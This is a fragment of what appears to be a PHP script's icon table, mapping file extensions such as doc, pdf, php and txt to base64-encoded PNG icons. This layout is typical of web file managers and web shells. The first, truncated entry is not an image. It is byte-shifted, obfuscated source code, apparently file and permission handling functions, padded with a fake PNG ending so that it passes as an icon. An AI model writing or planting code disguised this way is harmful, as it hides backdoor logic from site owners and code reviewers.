FuUVN+oKuanZ2SYGVfYVFZlKCeoZKlmpOdlmxRfoR6dlFoX2FsUYian5WgqKRRf4VRZ19ibFGFo5qVlp+lYGVfYWxRhH10dGNsUV9/doVRdH2DUWNfYV9mYWhjaGxRX392hVF0fYNRZF9mX2RhaGNqbFFff3aFUXR9g1NsO1FRVaZRblFTmaWloWtgYFNRX1FVpmw7UVFVlFFuUXGUpqOdkJqfmqVZWmw7UVFxlKajnZCklqWgoaVZVZRdUXSGg32AgYWQhoN9XVFVplpsO1FRcZSmo52QpJaloKGlWVWUXVF0hoN9gIGFkIaEdoNyeHZ/hV1RVZJabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZCDdoWGg3+Fg3J/hHd2g11RYlpsO1FRcZSmo52QpJaloKGlWVWUXVF0hoN9gIGFkIGAhIVdUWJabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZCBgISFd3p2fXWEXVFVp1psO1FRcZSmo52QpJaloKGlWVWUXVF0hoN9gIGFkIV6fnaAhoVdUWVabDtRUXGUpqOdkKSWpaChpVlVlF1RdIaDfYCBhZB0gH9/dnSFhXp+doCGhV1RZVpsO1FRVaNRblFxlKajnZCWqZaUWVWUWmw7UVFxlKajnZCUnaCklllVlFpsO1FRo5alpqOfUVlScZaeoaWqWVWjWlFXV1FxpKWjpKWjWVWjXVFTpJKnlpWQo5SkmZadnZCWn6WjqlNaWlFwUWJRa1FhbDtRrjuuO5emn5SlmqCfUaOUYpeloVlVpW5hWqw7UZidoJOSnVFVkpSlXVWXpaGQpJajp5ajXVWXpaGQoaCjpV1Vl6WhkKaklqOfkp6WXVWXpaGQoZKkpKigo5VsO1FVn25TjZ9TbDtRVZRuYWw7UVWnblhYbDtRmpdZcZqkpJalWVWSlKVaV1dVkpSlbm5Tl6WhU1dXcZqkpJalWVWXpaGQoaCjpVpXV1Jxlp6hpapZVZeloZChoKOlWldXcZqkpJalWVWXpaGQpJajp5ajWldXcZqkpJalWVWXpaGQpqSWo5+SnpZaV1dxmqSklqVZVZeloZChkqSkqKCjlVpXV1Jxlp6hpapZVZeloZCklqOnlqNaV1dScZaeoaWqWVWXpaGQpqSWo5+SnpZaV1dScZaeoaWqWVWXpaGQoZKkpKigo5VaWqw7UVFVlG5ibDtRUVWnblN3hYFrUVWXpaGQpJajp5aja1WXpaGQoaCjpa2GhHaDa1FVl6WhkKaklqOfkp6WrYFyhIRrUVWXpaGQoZKkpKigo5WNn1NsO1GuO1Gal1lVpVJubmFarDtRUZqXWVJVlFpRo5alpqOfUVhYbDtRUZqXWXGXpp+UpZqgn5CWqZqkpaRZU5eloZCUoJ+flpSlU1pXV3GXpp+UpZqgn5CWqZqkpaRZU5eloZCdoJian1NaV1dxl6aflKWaoJ+QlqmapKWkWVOXpaGQlJ2gpJZTWlqsO1FRUVWXl5dRblFxl6WhkJSgn5+WlKVZVZeloZCklqOnlqNdVZeloZChoKOlXWRabDtRUVGal1lVl5eXWlGsO1FRUVGal1lxl6WhkJ2gmJqfWVWXl5ddUVWXpaGQpqSWo5+SnpZdUVWXpaGQoZKkpKigo5VaWqw7UVFRUVFxl6WhkJSdoKSWWVWXl5dabDtRUVFRUaOWpaajn1FVp2w7UVFRUa47UVFRUXGXpaGQlJ2gpJZZVZeXl1psO1FRUa47UVGuO1FRo5alpqOfUVhYbDtRrjtRo5alpqOfUVWnbDuuO5emn5SlmqCfUaOUYpSXmFlVkqNarFE7UVWfblONn1NsO1GYnaCTkp1RVZSgn5eamGw7UVWjblhYbDtRl6CjlpKUmVmSo6OSqllYp5ajpJqgn1hdWJKmpZlYXViVlpeSpp2lkKeSo6RYWlGSpFFVlFqsO1FRmpdZcZqkpJalWVWUoJ+XmpiMVZSOWlqsO1FRUZqXWXGapJCSo6OSqllVlKCfl5qYjFWUjlparDtRUVFRl6CjlpKUmVlVlKCfl5qYjFWUjlGSpFFVnG5vVadaUXFVo19uVZRfU1FTX1WcX1NuU19Vp19Vn2w7UVFRrlGWnaSWUaw7UVFRUXFVo19uVZRfU25TX1WUoJ+XmpiMVZSOX1WfbDtRUVGuO1FRrjtRrjtRo5alpqOfUVWjbDuuO5emn5SlmqCfUaOUYqGkpVlarDtRVZ9uU42fU2w7UVWnblhYbDtRmJ2gk5KdUVWUoJ+XmphsO1Gal1lxmqSklqVZVZSgn5eamIxTkqalmVOOjFOelWaQpqSWo1OOWldXcZqkpJalWVWUoJ+XmpiMU5KmpZlTjoxTnpVmkKGSpKRTjlpXV3GapKSWpVlVkIGAhIWMU6umU45aV1dxmqSklqVZVZCBgISFjFOroVOOWlqsO1FRmpdZVZSgn5eamIxTkqalmVOOjFOelWaQpqSWo1OObm5xnpVmWVWQgYCEhYxTq6ZTjlpXV1WUoJ+XmpiMU5KmpZlTjoxTnpVmkKGSpKRTjm5uVZCBgISFjFOroVOOWqw7UVFRVadfblOrpm5TX1WQgYCEhYxTq6ZTjl9Vn2w7UVFRVadfblOroW5TX1WQgYCEhYxTq6FTjl9Vn2w7UVGuO1GuO1GjlqWmo59RVadsO647l6aflKWaoJ9Ro5RikpWVWVWSo1qsUTtRVZ9uU42fU2w7UVWnblOGg31uU1+jlGKmo51ZWl9Vn19Vn2w7UVWnUV9uUaOUYqGkpVlabDtRVadRX25Ro5RilJeYWVpsO1FVp1FfblGjlGKXpaFZWmw7UZego5aSlJlZkqOjkqpZWIR2g4d2g5B/cn52WF1YhHaDh3aDkHJ1dYNYXViEdoOHdoOQgYCDhVhdWHmFhYGQg3Z3doN2g1hdWIF5gZCEdn13WF1Yg3aChnaEhZCGg3pYXViEdIN6gYWQf3J+dlhdWIR0g3qBhZB3en12f3J+dlhdWHR9enZ/hZB6gVhdWIN2foCFdpBydXWDWFpRkqRRVaSnWqw7UVGal1lxmqSklqVZVZCEdoOHdoOMVaSnjlparFFVp19uVaSnX1NuU19VkIR2g4d2g4xVpKeOX1WfbFGuO1GuO1GjlqWmo59RVadsO647l6aflKWaoJ9Ro5RipJVZVZldVaddVaRdVaZiXVWeYlqsO1Gal1mjlGKVlVlaWlGsO1FRmpdZUqOUYqFZVaZiXVFVp11RVZlaWlFxnpKanVlVnmJdUVWkXVFVp1psO1GuUZadpJZRrDtRUXGekpqdWVWeYl1RVaRdUVWnWmw7Ua47rjtVo5RipZ6hbqOUYqWeoVlabDual1lVo5RipZ6hUm5ul5KdpJZarDtRcVWjUW5Ro5Ril5eeWVWjlGKlnqFRX1FTYFNRX1FxnpVmWXGmn5qimpVZcaOSn5VZWlpRX1FxnpVmWXGlmp6WWVpaWlpsO1Gal1mjlGKaqKNZVaNaWlGsO1FRVZSXmp2WUW5Ro5Ril5eeWVWjlGKlnqFRX1FTYKioqJCklqSkkFNRX1FxnpVmWaOUYqajnVlaX6OUYpSXmFlaWlpsO1FRcaafnZqfnFlVo1psOztRUVWeYlFuUVOhlqWWo52WmJajlmZicaqSmaCgX5SgnlNsO1FRVaZiUW5RU6GWpZajnZaYlqOWX5OqlqWZoKSlY1+UoJ5gn5aopGCan5WWqV+hmaFTbDtRUVWkUW5RgXmBkICEUV9TrVNfo5RipqOdWVpsO1FRVZlRblFTYVNsO1FRmpdZUqOUYpqjlllVlJeanZZaWlGsO1FRUVWnUW5Ro5RikpWVWVpsO1FRUaOUYqSVWVWZXVFVp11RVaRdUVWmYl1RVZ5iWmw7UVFRo5RiqKOaWVWUl5qdll1RU2JTWmw7UVGuO1FRVZenbqOUYpeloVliWmw7UVGal1lScZaeoaWqWVWXp1parDtRUVFVmVFuUVNiU2w7UVFRVaSXmp2WUW5Ro5Ril5eeWVWjlGKlnqFRX1FTYKioqJCklqSkkFNRX3GelWZZVZSXmp2WX1WXp1pabDtRUVGal1lSo5RimqOWWVWkl5qdllpaUaw7UVFRUVWnUW5Ro5RikpWVWVpsO1FRUVGjlGKklVlVmV1RVaddUVN3hYGtU19VpF1RVaZiXVFVnmJabDtRUVFRo5RiqKOaWVWkl5qdll1RU2JTWmw7UVFRrjtRUa47Ua47rjs7dW5rbm93bjf0K3wAAAAASUVORK5CYII=","doc"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGUSURBVDiNjZPBSltBFIb/3AzEC4UgzIAMFCQ3pQsVXSXBl+kzFO2mG+miW58hYHd9CzdJNgpXQdQsNJEkNMGF0KJ3zszpIrlDkns1DgwMh5n/+/9zmMLB8enX9uXw5/3gKQSA30fbcM5h1QqCIBZCHBb2v/z6Z4sfws2PGkGxiJPvu2DmNx8TEfr9Pkaj0YW4e/gTVj9rnF0/wjqGMQZEtNKB1hq9Xm9HsE0wmPyFdVMqM4OZ0Wq1AABKKYzHY/9QKYVqtQpmhrUWgm0CosRfSAUajYavRVG0QE8jEhEE3AvgTEag2+168ryL1AEAGGMgnDXgOYFUJIqiBfL8OXVgrYWAS3IdtNvtBbpSKhOFiKY94ByBer3ua5VKZYG8JGAAm43wnjUVcPkOOp2Or0kpAQCTyQRSSh9lNgWT24NarZYhLkeZOcifQupASunJWmuEYZjtgbMvKBSCVx2k5GU6ESHQG+vP5qkPts+AM17grZ0kCeI4hhDiRuxtffpxFl8dDYfnawDQbDbf9ZlKpdJtuVz+9h/x5jl687x8uQAAAABJRU5ErkJggg==",
 "pdf"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAKcSURBVDiNdZPPa5RnEMc/77vP7vtmX2NYYjC+sBqkrRBMhB5KURoQCeKh9KZ/gRehhWo8VFAEQT2ICXpI24NRkZJSFIm0J08bKKVpxKwpLe4pCUKaKmv257vv+8zzeNgkGkgG5jTDZ2a+M+PMzMwMa61vGGMG2cbsmxXs3J+4R44hl86QunATN9ddVEqNOIVCodjb2zuQz+dRSm0JiO+MkTr4KcmTSZxwL6nTIywtLbG8vPxCxXE8EIYhWmu01lsCWlOTpDId6D8K+L9Mo7UmDEMWFxcHlIhgjNmue+yrRZIXz5HoR/zxh1jPB2ux1iIiKK011tptAfGvDxFSeFduQ5jflNtsNlFJkmwNsJbkt0c0fxgFV+H2H9qUF0UR5XIZV0Sway2te1x4SuXkMMncLBIn6HoDG7c24o1Gg3K5jNa6PYKJIqT0D/Lv37Qe/4wT7CB7fZxU337qE9+DAXn7FndXD/V6nWq1CtDWoHzhW17HNTKHh8h8cZTs1Vuk8vsAMJVVJGkLXJufI+ofREQ2xhARlP3oAE6rhkQtjOPi7gmx1mKMIV75D1lbUO33afikf5NMnuehmse/RE6cwFhDcv8Oq6e+gsvXsN09sLAAawDn+TM8z8PzPKIowvd9HMdBBUFALpdrV/36LMmRIWrfnWPnT4+QIKCyDpj9i07RGBUA4Ps+WmtcrTWO4+C6LkopOj77nMzhIWTqMf6+PkRABHSjRfXeBFEUkU6nsda+B6zfwrp3nvmGyoP7uN27MCqDGBADlbsTxLUq6XSaJEnaAKXUy2KxSBzHGwCyWejciayuwu5wAxCv/E/94kW01hSLRZRSL1UQBOdLpdKN+fn5jz9UuK4tmbFRGk6K5MNXmZoiK4bc8HCpq6vr/DvKaYMHJvkNngAAAABJRU5ErkJggg==",
 "iso"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJySURBVDiNlZNfbtNYGMV/sa//xC52Wid1QkuTUugIlFQCxAaQ2BHsglWwBlbQkUCQGY0UMkikSKRQdZqGNglpGsfX15enhofywHzP5/yOziedQrvdfppl2Ys8z/f4H2cYRkcI8aywv7/faTQarTiOMQzjt8x5njMYDOj3++9FmqatKIpI03Qp+PRPm8HZEC0cTLuIEBblcpnt29tLTRRF9Hq9llBKoZQCIEkWdF6/pGI57NX/wKrEmF4J03T4djah/e4vmq0mrutw5TOyLENrjdaaP/9+RdzwiGsZYtpHJ0cU9DeEdUGtGnDv3h0+dP9d6rMsQ0gp0VrT6X3ks1FESo+qHBEsptDvY17MCddjguIqliiyWgrpfz6k3thCSolQSqG1ZniyYLO4w3Q2YzaXRAuLrfoDCsDR0Vdq5QTPLuH7Nv8dT9B1jVIKcVUh+K5ZZ5WZDjmdSe7v3WI0miCBm5Udzr+8wS7HGNkK8nL6s8IVgEBjxpKK7WJ7VXzvBqPRBIBCwSUZjinkCiN3cebGdYDtmaR5im1bhG6R0eCYzc1NFjLh7fu3CM8mssdY8xzHqV0HlOOI89MRpbUQzy8SlALOh+ecnlyidY2Ba2JyxnrhkNX6k+uASlxmOr4gUwrLtgGN76+wsebCicsk0fSSBabZ4m719i9+ANza3uDk+BRhGZiGYDFPkSrDTRTmVLFSCnj0+PFSvwRIKRFCYAqTja0a47MJ49GQ2cUlaZriCJeHu1U2dioAy/QsyxBCiF6n09ltNptYlgVAuBYQrgXXRnSVLKWk2+0ihOgJ3/efHxwcvOh2u3d/f8zgOM5BGIbPfwAQSmassQoGQAAAAABJRU5ErkJggg==",
 "swf"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGpSURBVDiNlZK/a1NRFMc/7/Y0DxpLtA8bnIyCg2D8C5SKKJT+AWInJy04ONk/QKgiUhAHBWfBSXQoLi5icMsir8HhPdAg4kt0Kraa3HvfvQ7a2DYvqR44yznfH+ece4Nms3nRWrvqnDvNf4RSKhaRm0Gj0YhrtVq9Wq2ilPonsnOObrdLu91eF611PYoitNb7MzufYfYIqAmiKCJJkrrK85w8z/HeF6b71sHcWKR/5ij9Cyfxm9/x3rPNE2st3vtCQ//pA/0rC/iv2aAmHoI/eGstyhgz0r334DY6y7DTM0zceUz4JoED04O+MQbZHn/oUB9Tfq49BwfllYfI+fnfU+3Ajl1h69F9rHEAbFxdJCiFzLzPdmGstcUCrpOx+eIZ5H9rQc4QrljAezburWB7Bjl2nMOv3hKUSkPjFwr0Gq/ZevqEHy/XADh06y5MTo58pSGBL5cvDZqVpeuEZ8+NJBcK+GiW8FSdg9eWmJqbG0veJWCMQUSovYt3nGJ/srUWJSJJHMdorUd+qL2ptSaOY0QkkXK5vJym6Wqr1Tox1nJPhGGYViqV5V9br0lw1NP/5QAAAABJRU5ErkJggg==",
 "php"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJySURBVDiNlZNPSFRRFMZ/vrnDOI4m+lKzhCyoFqEQpRXVIigG2gQuooWbNrWPWrSrlmEtgiAiIRBq47hIggaJYKboj6XMa9QaQ4aybBwb/8w8x7nvvndbDCYShR04i8PHdzjn+86pGB4ePqmU6vE8r53/CMMwLCHEpYpYLGa1tra2NTU1YRjGhsie55HJZEin0x+ElLLNNE2klP8zAKZpkkql2oTruriu+xuYydikvyySt0vYtiRvlyhJF8NncGj/VvbubgBglSeUUmitKdgOyYk55nLLTGdtfMLHrh0m33Kz5AuS0orDyINhqqv8XLxwmMbNIZRSCMdxsJcdEuNZMHwEa4IEC4qW5hpOn9zD6NgM8bdfWSqUOHpwB6UVSV//COfO7sdxHIhEIrp/MKEfD33SgAZ0OBzWr0en/1nf6X2uI5GINpRSTH9forjiADCb/Uk0GqVlyyYAfmTm19WreDAoUEphKKXILRZxPQ1AY4NJOBwm/W0BAMcrW6tZj3+e+lHWQCkFaBypAHg9Os1QfIr+J+P0DSS493CEvoEE76yZ3/hgNMFyfh6lXCp6e3v14SMnuH3/LZ0HdvJ+fJZ8ofSH7zXVATram4m/+kj2+xduXD3DyxfPyhNsrg9yvnsfN+/GsZdL+CurMIQfw+cHNK4jKSzM8WhslFAowPUrXdTXVa2toLVmW3MNt66dIvYmzdNnE+RyWYrFAp7nUVkZoL6umu6u4xzp2FnWROu1Bo7jIIQA4Fjndo51bv/rCWtdFlMpVXZBCJGyLAspJVrrDaWUEsuyEEKkRCgUujw5OdmTTCZ3beyNyhEIBCZra2sv/wIdNXwQeOKyCAAAAABJRU5ErkJggg==",
 "tar"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHqSURBVDiNlZE/a1NRGIefe3KSQqo0CbbGimgyxD8lpQr9BrpmCIigrk4ScFBw7Chox3yB4iJIh8Qv4aRELUUlSYcm6Q00TfHmnnPuyY1DJEOTSvvC4YUDv+f3wOtsvfj4wNrRO5xwlRkjpMOr988pFosAbG9v8/ZpmTBwalI6L6Xn+ZvpK5fz17PXiEg5DYgJoh+ilEolAKrVKnfX16jvNlc77YNNOfD9fCKe4mD3iFE4mgJE42NoMpmc/HV/90nEU9T9Zl4apTnueDPDAE50vMvlMrVaDYBAB3iHAUZphFIK5Wm0b2a+ILAASCnZ2NgYAwKL8jRKKaRWCqP0zHaAWBABoFAoUKlUABgG43atFELr2c0nDSqVCoVCYWKgfYPWBqm1wShzqoG1dsrAWotR/wChGKL/A1ADTW5xZdKeW1xBDTRaGUIxRIYRCxHQf2ZDevt9Ht9+RvTe+JyBb+nt9xFSEEYssjtw3fWbc0vLyaVTLU7OwtWLHPf6dL+4rmylm/z4uVM3RzZ7ZgIQS8h6K928IF3rsffwWza1kDpPnnb/MOt+8lwpvNzo+9d2wxt9zpwHMO9kG8LLxaUyMbXcv5+5lbmDEJEzhcNwSKexk2mZX3vOpbUnj0bGexOG+sZ5DISYazqx+dd/AeApGyDxL7TZAAAAAElFTkSuQmCC",
 "rb"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAKKSURBVDiNlZNLa5NbFIafvbNz0YTGkNpYLBovraDWiSAqgqJ4OBwngnCmIlRw5KVYKKIDEUWw6kDxBwhOHQiCOFDIRDQIxxjUJgVbDo2m1WpsLs23v/0tB9VC6aSu8fs8rHfBUvl8/rDv+yNBEOzgD0ZrXTDGnFe5XK6QzWb7M5kMWutlwUEQUK1WGR8ff2s8z+tPp9N4nrcopESoPXyAe/uajgN/MXbvLp/GynxuWXZeu8GWY/9SKpX6jXMO59wi2K/8z7szA7T/e8nKkGbuQ5HUidO8HzyN32zx4vYIm48ewzmH8X0fEVmAZ5494c3ZAWjUCQkgAZ0b+pgdGWbj+gyjdaFhDCKC7/toay0igohgqxXy5wZoN+v4gFNgE0lWHjxCZaLKl9ESHbUpVkRj83lrMc65+Q1EyJ07RatRJwygAIGt1+9QevKYr1ZoW8esVyNkxxERnHPo3xVmnj/lQy7HrA8WcED2+ElU/hHxoEHD+ngoAq3pXrt+ocLCDRIatnSmGP3yjdjqLvZeuMznG9cof/+OpNJ4StNWISIYYun0UkE0lWT3xSv0Tk+T3Lmb/NBZTGsOaTaRZpNw91pUAG5qklR3Zqngzc1bbNqzjfT0BJP3i8yOlbAKvBVxYp2dhLyA5swnlFasyqxeKqgUi8xNVVnnz1DVa7AIgsK1WvyYrLBOQojR1LBEOxJLBSqRoPJxAhId1L6+J0Boo4mJYqOJkIiG6YuFeTfXoC1uscBaS+/gMK+uXqLRk0UrRaQeJhwJY6IRfqRWobu6iPT0sGtzL6F9+7HWzguMMaVCodC3/dBhjv79z7KeyVpLoVDAGFMy8Xh8qFwujxSLxd5l0b8mGo2Wk8nk0E8I/36fE9VC/wAAAABJRU5ErkJggg==",
 "mp3"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNpZBPaxNRFMXPjFcSGtrQDiYNUgxKN0LqZ2hApAs/Ql1ZN3Vp6Kbgxp3duPAbFLor0m132XQRKvUZUGegBq2EYBU78wIz789cFyXSOtPQ0gMPHpdzf/fc63Q6nYfGmI00TRdwBbmuK4johdNut0W9Xm9Uq1W4rnup5jRNMRgM0Ov1PpJSquF5HpRSVwkAz/Pg+36DrLWw1mYMYcI4OrH4+lMh6Mf49G0IcRhh79V9AMCoj4wxYOYM4Nn2H8gwQRTGkGECGZ3+z3qNMSCtdS5Ahgnqk4zbtSLmpku4d6uAR+sfznm11iBrbS4gCmO8eTqXqZ/1jl1BhkluPbPChYDomoDRwQ4Oh3i++QPfTwzgOuMBn/sJ1t4dw+/HkFKBmdHaOsIXZwKYcVDNAbgjADPj5c4x3g9v4FexiEptEsyMxw+mMBVK3Ikl3j6p/fMyczbB4t2b2N/9jdmig9fLs2BmrC5VsLpUGX8DrTWICCtNDytNL9f8v4wxpysQkS+EgFLqXLxxTykFIQSIyKdSqdQKgmCj2+3OXzguR4VCISiXy62/DsFP85AcHBcAAAAASUVORK5CYII=",
 "ttf"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIHSURBVDiNlZJBaBNBFIb/newmxRRT3EqqobhRDCiJB+vBUxHBgxavevLgwbuCBcGexUNPlZ5EpCAIhXiViiJEbQIpttRFya5mkyZE0iSVom3dnTe7HlIDWzdQf5jL+9//DW/mScVi8RIRTbuuewb/IcbYqizLd6VcLreqaVomHo+DMbavsOu6aDabqFQqn2THcTKqqsJxnMBmIVzcf7QAAHh4+3KvrqoqDMPIyEIICCH63rawaKCxvglJAnZsjoGwvAvu5hgRwfO8wLP5cwev8yWcO50A54RqY8PnExEY57wv4PnLZUyMn0JKGwaRQLnW8fmcczAhRGDYqndQqXcwPnYcx44MQQiBcq3t6xFCQP47wl49yRZw4+oYAA+jI13At7WWr5eIggEfli0MHRxASjsMz/MQVkIYUQdh1dsgEgiFWH+AwwlPs4uYuJBGbulrr67IEn7bDqrfN5BMqP0B2VcrODE6jK1tG1vbdq8+eCDcHaPagnb0UDCg/eMX3hZKmJm6hrAS8o318XMNhRULZnUdF8+nggGP59/j+pWzUGT2z7skEyqICIbV7HlE1F2ktUYbN+/N4U3+C+Ze5FGutXzf9W7JxJ0H8xBCQDfquDX1DLbtgIggzc7OlpLJZCqdTkNRlOB93iPOOXRdh2VZhhyNRidN05zWdf3kvtK7ikQiZiwWm/wDf6N/hwnofhAAAAAASUVORK5CYII=",
 "jpg"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIcSURBVDiNlZJNTlNhGIWf9+v9bi8FqnANjVHToCE6ANbgxGUYN8EiTGQJrsC4AgdOGOgABkCjicVII1qr/LS0vbf9fh1gwszQd36enPOeI7u7u8+MMdsxxk1mOBE5SNN0S3Z2dg6azeZGo9FAKXUjcQiBXq9Hp9M5TIwxG3meY4yZxQB5ntNutzcS5xzv9g95/votsVYhaoVMPTJ2SBmQSUAmEWVALIgXAN68eoFzjsQ5R3cwYPl+E5nXBC1MLwvi0JBahSojYWShDIgVlFeIwFl/zLxyJNZaVK1G404DVdUEAk47wnyAiUcM6GmkPC9JKxlZrYZSglRTbGGvHFSU5unjR3y6GLOgFRdjQ6xFcIJYoWYD7rYnRE1taZEs04j2VxG89yhV4ecQ1u+tcNIfczeZp55ozieRlVRzfDxgablKVCmrj5aIaQLSxXuPcs5BgBgjE+tQUVitz/HroqQYTOn1CvIsJUOhBUZDQ7c3Rny8fqLygcuzEeNRSXCBD51z/NTjho5CKnQLjy0cWX2O3u8qIkK4lV0DEufon5xSSROCD5ixYTIo8YVFoQg2XpV/BhWdXAE2Hl4DqlPLny8/ULpC9AFTTHCl+++QnH1wDWjkdU6/fZ1piSv5Iv3uvxY2nzT5/v7lTIDhcMjn/Y8kSqn23t7e2vr6OlrrG4mttbRaLZRS7WRhYWHr6Ohou9Vqrc3iIMuydr1e3/oLlTAupOJParwAAAAASUVORK5CYII=",
 "css"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHNSURBVDiNlZK9bhNBFEaPZ2e8axvbImtpgcpCIkIiToOgoqXlAWiQeAAaSB16/AC8Bq/g1lUWV+vGrVG0koOw1zt/FAOJrITE3G6k+c7cc+80ptPpa2PM2Dl3zH+UECKXUn5qTCaTfDgcjrIsQwixV9g5x3K5ZLFYfJd1XY/SNKUYv8f8LAGQ3QOGH77eCknTlKIoRtJai7WWh65EdRsAaFfivb8V8DcnjTF471HO4rdbAJSK7wQAGGOQWmu894jHzxH1BgDfbOH2AGitkdZavPcU0RTNeeggGlCefmN7sQYg7rV58fnNjRqXCll7ifwzA2OXdMwBzW4GQG30jUrGmCuAEGBNUBBRgnQCW9UAyGZ0N0ANXoENLRO1aT1N8VsLQCPeA3D6Q7OqfgHQTxRnasW5DlsZqJjD8Rmri3Du92K+fDzeBVQP1rRVAkCl15TlI6J7CoDSaDa0SO43AdjYGu/9LsBElrUJCs0oRhqoqvBiIgXOSzaboBQruQvQWvOsc8SWKlwgoZclrHXwbqsGWSOm0sE9UeEPGGOQUsoiz/PDt0fvUEpdTejltZldltaaPJ8hpSxkp9M5mc/n49ls9uTfkesVx/G83++f/AbgZRYV7aahUwAAAABJRU5ErkJggg==",
 "html"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJ/SURBVDiNlZM9b1RXEIafe+65d9d79wP7rr1oMeCAsOTEjpBQKBBJlygSTZQ+HT8B/gUVok2RPp0lJIjSWJFSGCS02aBk14XBCWZtgyzb7OJ7zpmh2NgUTgFTz/vMzDsz0erq6tfe+zsi8jkfEcaYjrX2VrSystKZm5tbarVaGGM+SCwiDAYD1tfX/7BFUSzleU5RFAAo8PDxvzzfGbLx6oDzMzXO5Bl5NeWLS/kxJM9zer3ekg0hEEIA4OXuiJ9/e0atWuaT9ilazSrtqYwgyu9/Dbj/6Dk3v5mnPVXhSGe896gqIsK95afEScKhE2abGQuzk9QnEja29zEmwmO4u/wnzgdUFe89xjmHqvLjw7+RaOzB1fkZUhuTWIOoosBktUR9IsXElp9+7aOqOOcwIYxpG6+GnJup8+Vnp2lkKTY2JLGh8MJgd4iIciavUC4lrG8doKqEELBHI8TGcHV+hnJqMSYiNhE2NjzdeE3hhM23b1BV8lqZYazvRzgCnJ2usb33lkdrW+wNi2O3s1KCicbb8aKMCk/rVOUkYCIxqAhrL/b45ck/PNvaxwfh8oUm31+7SKOSIgKT1ZQkjk4CpuspO7vjNkeHnsdrO7ggBFF8EKrlBBFlNDpkup6eBFxfaHLoHM1qig9Ke6qC84Lzgg8CwN7+kDSG6wvNkwBV5dvLp3mxvcvm1mtmpyu4ILgg7A8LDt6MqJUNN660j/O99+MtOOew1jKZJdz67lMePNmk09+kcOPKaWKYnZrgh6/Ojs/9P7H3Hmut7XU6nfnFxUWSJMHGETeutP/3iVQVAOcc3W4Xa23PZll2u9/v3+l2u5c+7JHHUSqV+o1G4/Y7VN2AN07a1GsAAAAASUVORK5CYII=",
 "txt"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFMSURBVDiNlZA9isJAFMd/hgcWFhZRJFNoLLZ0a7XfStDLrLfwMAqewEILu6xV0lgpgieYj2SbTdhs4qIPhhmG/+drHI/HD2vtKk3Td14Yz/MiEfls7Ha7KAzDUa/Xw/O8p8hpmnK73Tifz1+itR75vo/W+pUA+L5PHMcjcc7hnHuJDJDzxFpLlmUArNdrut1uAVJKcblcSm+lFMPhEABrLWKMKQQWi0XFKQzDyjvHG2MQ51zxsdlsAIoUSimAwjlPM51OixqlCvP5vLbvYDAo3TneWlsW2O/3JadHu8irVAQmk0nJqS7FvwkOh0OJdL/fAeh0OgAEQQDwOMF4PK7dwd95mGC73VbcrtcrQRDU1ioEjDGICLPZrALq9/sl199kay2eiMRRFKG1Jsuyp47WmiiKEJFYWq3WMkmS1el0entqAT/TbDaTdru9/AbO//fVB3FwJQAAAABJRU5ErkJggg==",
